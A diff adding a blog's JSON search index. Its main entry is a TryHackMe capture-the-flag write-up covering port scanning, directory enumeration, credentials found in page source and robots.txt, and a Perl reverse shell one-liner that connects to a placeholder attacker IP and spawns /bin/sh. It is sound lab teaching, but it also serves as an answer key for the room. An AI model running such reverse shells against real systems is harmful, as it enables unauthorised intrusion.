@@ -1,0 +1,34 @@
+[
+  
+  {
+    "title": "TryHackMe",
+    "url": "/posts/THM/",
+    "categories": "TryHackMe, CTf",
+    "tags": "web, exploit",
+    "date": "2022-07-11 00:00:00 -0400",
+    
+
+
+
+
+
+    "snippet": "Port ScanningStarting Nmap 7.80 ( https://nmap.org ) at 2020–04–10 15:35 IST  Nmap scan report for 10.10.222.8  Host is up (0.22s latency).  Not shown: 998 closed ports  PORT STATE SERVICE VERSION  22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)  80/tcp open http Apache httpd 2.4.18 ((Ubuntu))  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .  Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds      Nmap gives us this result and only 2 ports are open.        Let’s move ahead to the website running on port 80.        This webpage comes up on port 80. There’s no useful data in here.        But what if we check the page source?    We got a username here in HTML comment!!Note to self, remember username!Username: R1ckRul3s  But where do we have to use it?More Enumeration!!!!!  I used dirsearch to find out interesting directories and files.[15:49:33] 301 -  311B  - /assets  -&gt;  http://10.10.222.8/assets/[15:49:40] 200 -    1KB - /index.html[15:49:42] 200 -  882B  - /login.php[15:49:47] 200 -   17B  - /robots.txt      Dirsearch result gave me a few directories which could be interesting.        /assets had GIF, CSS, JS files which are being used in the website, nothing interesting there.  I headed over to robots.txt file to see if there’s anything interesting.      It had this weird string Wubbalubbadubdub        Next thing to see was the most interesting page found by dirsearch, the login page!        /login.php served this basic login page! We have a username which we found in the page source! ‘R1ckRul3s’.        WHAT COULD BE THE PASSWORD!!! Maybe the weird string we found in robots.txt?        I tried username ‘R1ckRul3s’ and password ‘Wubbalubbadubdub’.    LOGIN SUCCESSFUL!!!  We are redirected to /portal.php in which we are given a command panel.Trying ‘ls’ lists out all the files in the directory including ‘Sup3rS3cretPickl3Ingred.txt’But wait!! We can’t read the file! If we type in ‘cat Sup3rS3cretPickl3Ingred.txt’ we are served with an error      Head over to Pentest Monkey’s Reverse Shell Cheatsheet.        I tried bash reverse shell payload but it didn’t work, next up is perl payload.  perl -e 'use Socket;$i=\"ATTACKER-IP\";$p=LISTENING-PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'This payload WORKED!!! We got the shell using the perl reverse shell payload.We have our first flag, there are 2 more flags in the machine. Let’s read the clue.txt to see if there’s anything which can lead us to flag 2.Content of clue.txt :-Look around the file system for the other ingredient.I tried finding flags in several directories and finally got the second flag in home directory of the user ‘rick’Heyo! Third flag is still somewhere in the machine!!I tried sudo -l to see if we have any sudo permissions!We can use any command as root without password!!!  We got the 3rd flag in /root directory!      Fuzzing around with different reverse shell payloads might actually be beneficial and maybe we can get access!!        PWN!!  "
+  },
+  
+  {
+    "title": "About Me",
+    "url": "/posts/About-Me/",
+    "categories": "Blogging, Demo",
+    "tags": "typography",
+    "date": "2022-07-11 00:00:00 -0400",
+    
+
+
+
+
+
+    "snippet": "Hello This is  Mr.Niko  Test MD"
+  }
+  
+]
+
